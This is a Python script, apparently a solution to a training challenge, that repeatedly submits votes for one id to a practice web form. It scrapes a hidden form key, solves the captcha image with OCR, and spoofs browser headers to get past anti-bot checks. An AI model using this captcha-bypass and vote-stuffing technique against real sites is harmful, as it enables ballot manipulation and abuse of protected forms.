#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
import pytesseract

url = 'http://158.69.76.135/level3.php'
captcha_url = 'http://158.69.76.135/captcha.php'
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ' +
                        'AppleWebKit/537.36 (KHTML, like Gecko) ' +
                        'Chrome/74.0.3729.169 Safari/537.36', 'referer': url}
i = 0
while i < 1024:
    s = requests.Session()

    rep = s.get(url, headers=header)
    soup = BeautifulSoup(rep.text, 'html.parser')
    key = soup.find(type='hidden')["value"]

    captcha_img = open("captcha.png", "wb")
    captcha_img.write(s.get(captcha_url).content)
    captcha_img.close()
    captcha = pytesseract.image_to_string("captcha.png")

    data_to_send = {'id': '4256',
                    'holdthedoor': 'submit',
                    'key': key,
                    'captcha': captcha[:4]}

    r = s.post(url, data=data_to_send, headers=header)
    if str(r.content) != "b'See you later hacker! [11]'":
        i += 1
